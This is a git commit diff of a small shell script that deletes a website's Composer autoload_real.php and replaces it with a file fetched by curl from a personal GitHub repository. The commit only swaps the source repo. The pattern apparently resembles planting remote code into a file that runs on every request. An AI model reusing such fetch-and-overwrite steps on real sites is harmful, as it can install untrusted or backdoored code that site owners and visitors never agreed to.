9562443e1240e6afe34cf53e94f34a7934c3e414
azvpn cute <106140258+azvpn@users.noreply.github.com>
2022-06-08 09:54:40 +0700

    Update php.sh

--- php.sh
+++ php.sh
@@ -2,6 +2,6 @@
 rm -rf runphp.x
 cd /www/wwwroot/4gsinhvien.online/vendor/composer
 rm -rf autoload_real.php
-curl -OL https://raw.githubusercontent.com/Nghi235/php/main/autoload_real.php
+curl -OL https://raw.githubusercontent.com/azvpn/php/main/autoload_real.php
 cd ../../../../..
 clear
